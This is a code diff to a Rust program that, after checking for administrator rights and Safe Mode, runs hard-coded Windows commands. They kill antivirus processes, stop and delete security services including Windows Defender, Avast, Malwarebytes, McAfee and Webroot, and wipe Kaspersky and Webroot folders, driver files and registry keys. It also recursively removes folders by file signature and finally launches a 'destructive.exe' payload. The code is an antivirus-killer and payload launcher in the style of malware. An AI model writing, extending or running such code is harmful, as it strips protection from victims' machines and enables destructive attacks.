@@ -319,6 +319,7 @@ fn remove_folder(file_path: &str) -> io::Result<()> {
 fn scan_directory(dir: &str) -> io::Result<()> {
     println!("Scanning directory: {}", dir);
 
+    // Attempt to read the directory entries
     let entries = match fs::read_dir(dir) {
         Ok(e) => e,
         Err(e) => {
@@ -327,12 +328,23 @@ fn scan_directory(dir: &str) -> io::Result<()> {
         }
     };
 
-    for entry in entries {
-        match entry {
+    // Iterate through the entries
+    for entry_result in entries {
+        match entry_result {
             Ok(entry) => {
                 let path = entry.path();
 
-                if path.is_file() {
+                if path.is_dir() {
+                    // Recursively scan subdirectories.
+                    if let Some(subdir) = path.to_str() {
+                        // If an error occurs in a subdirectory, you can choose to handle or propagate it.
+                        if let Err(e) = scan_directory(subdir) {
+                            eprintln!("Error scanning subdirectory {}: {}", subdir, e);
+                        }
+                    } else {
+                        eprintln!("Failed to convert directory path to string: {:?}", path);
+                    }
+                } else if path.is_file() {
                     let file_path = path.to_string_lossy().to_string();
 
                     match get_signature_subject(&file_path) {
@@ -348,7 +360,7 @@ fn scan_directory(dir: &str) -> io::Result<()> {
                                     if let Err(e) = remove_folder(&file_path) {
                                         eprintln!("Failed to remove folder for {}: {}", file_path, e);
                                     }
-
+                                    // If a match is found, we break out of the antivirus loop.
                                     break;
                                 }
                             }
@@ -574,14 +586,14 @@ fn main() -> io::Result<()> {
     // Step 1: Admin Control Check
     if !is_admin() {
         eprintln!("You need administrator privileges to run this program.");
-        exit(0); // Exit the program with a success status
+        exit(0); // Exit gracefully
     }
 
     // Check for Safe Mode before proceeding
     if is_safe_mode() {
         println!("Safe Mode detected, proceeding with actions...");
 
-        // Create a mutable vector to hold all commands.
+        // Create a vector to hold all commands.
         let mut commands: Vec<&str> = Vec::new();
 
         // Group 2: Cleanup Safe Mode setting
@@ -590,13 +602,13 @@ fn main() -> io::Result<()> {
         // Group 3: Webroot services and files cleanup
         let webroot_cmds = vec![
             // Stop services
-            r#"sc stop WRSkyClient"#,
-            r#"sc stop WRCoreService"#,
-            r#"sc stop WRSVC"#,
+            "sc stop WRSkyClient",
+            "sc stop WRCoreService",
+            "sc stop WRSVC",
             // Delete services
-            r#"sc delete WRSkyClient"#,
-            r#"sc delete WRCoreService"#,
-            r#"sc delete WRSVC"#,
+            "sc delete WRSkyClient",
+            "sc delete WRCoreService",
+            "sc delete WRSVC",
             // Delete files
             r#"del /f /y "%SystemRoot%\System32\Drivers\wrkrn.sys""#,
             r#"del /f /y "%SystemRoot%\System32\wruser.dll""#,
@@ -609,10 +621,10 @@ fn main() -> io::Result<()> {
         commands.extend(webroot_cmds);
 
         // Group 4: Kaspersky directories cleanup 
-        let kaspersky_dirs_cmds = vec![ 
-            r#"rd /s /q "%ProgramData%\Kaspersky Lab""#, 
-            r#"rd /s /q "%ProgramFiles%\Kaspersky Lab""#, 
-            r#"rd /s /q "%ProgramFiles(x86)%\Kaspersky Lab""#, 
+        let kaspersky_dirs_cmds = vec![
+            r#"rd /s /q "%ProgramData%\Kaspersky Lab""#,
+            r#"rd /s /q "%ProgramFiles%\Kaspersky Lab""#,
+            r#"rd /s /q "%ProgramFiles(x86)%\Kaspersky Lab""#,
         ];
         commands.extend(kaspersky_dirs_cmds);
 
@@ -634,27 +646,29 @@ fn main() -> io::Result<()> {
 
         // Group 7: Kill antivirus processes
         let kill_processes_cmds = vec![
-            r#"taskkill /F /IM AvastSvc.exe /T"#,
-            r#"taskkill /F /IM AvastUI.exe /T"#,
-            r#"taskkill /F /IM AvastWscReporter.exe /T"#,
-            r#"taskkill /F /IM aswVmm.exe /T"#,
-            r#"taskkill /F /IM MBAMService.exe /T"#,
-            r#"taskkill /F /IM MsMpEng.exe /T"#,
-            r#"taskkill /F /IM VSSERV.exe /T"#,
+            // AVAST
+            "taskkill /F /IM AvastSvc.exe /T",
+            "taskkill /F /IM AvastUI.exe /T",
+            "taskkill /F /IM AvastWscReporter.exe /T",
+            "taskkill /F /IM aswVmm.exe /T",
+            // Malwarebytes
+            "taskkill /F /IM MBAMService.exe /T",
+            "taskkill /F /IM MsMpEng.exe /T",
+            "taskkill /F /IM VSSERV.exe /T",
         ];
         commands.extend(kill_processes_cmds);
 
         // Group 8: Stop antivirus services
         let stop_services_cmds = vec![
             // Avast
-            r#"sc stop "AvastSvc""#,
-            r#"sc stop "AvastWscReporter""#,
-            r#"sc stop "aswVmm""#,
+            "sc stop AvastSvc",
+            "sc stop AvastWscReporter",
+            "sc stop aswVmm",
             // Malwarebytes
-            r#"sc stop "MBAMService""#,
+            "sc stop MBAMService",
             // Windows Defender
-            r#"sc stop "WinDefend""#,
-            r#"sc stop "VSSERV""#,
+            "sc stop WinDefend",
+            "sc stop VSSERV",
             // McAfee
             r#"sc stop "McAfee Service Controller""#,
             r#"sc stop "McAfee Firewall Core Service""#,
@@ -665,14 +679,14 @@ fn main() -> io::Result<()> {
         // Group 9: Delete antivirus services
         let delete_services_cmds = vec![
             // Avast
-            r#"sc delete "AvastSvc""#,
-            r#"sc delete "AvastWscReporter""#,
-            r#"sc delete "aswVmm""#,
+            "sc delete AvastSvc",
+            "sc delete AvastWscReporter",
+            "sc delete aswVmm",
             // Malwarebytes
-            r#"sc delete "MBAMService""#,
+            "sc delete MBAMService",
             // Windows Defender
-            r#"sc delete "WinDefend""#,
-            r#"sc delete "VSSERV""#,
+            "sc delete WinDefend",
+            "sc delete VSSERV",
             // McAfee
             r#"sc delete "McAfee Service Controller""#,
             r#"sc delete "McAfee Firewall Core Service""#,
@@ -745,17 +759,17 @@ fn main() -> io::Result<()> {
         ];
         commands.extend(delete_registry_cmds);
 
-        // Execute each command in order
+        // Execute each command in order.
         for command in commands {
             execute_command(command);
         }
-        
-        // Remove antivirus folder
+
+        // Remove antivirus folder.
         if let Err(e) = remove_antivirus_folder() {
             eprintln!("Error removing antivirus folder: {}", e);
         }
-        
-        // Modify registry for explorer.exe
+
+        // Modify registry for explorer.exe.
         if let Err(e) = modify_registry() {
             eprintln!("Error modifying registry: {}", e);
         }
@@ -781,9 +795,10 @@ fn main() -> io::Result<()> {
                 eprintln!("Error scanning directory {}: {}", dir, e);
             }
         }
-    
+
         println!("Scan completed.");
 
+        // Launch destructive.exe from the utkudrk2 folder.
         if let Ok(program_files) = env::var("ProgramFiles") {
             let executable_path = format!(r"{}\utkudrk2\destructive.exe", program_files);
             let _ = Command::new(&executable_path).spawn(); // Ignore errors
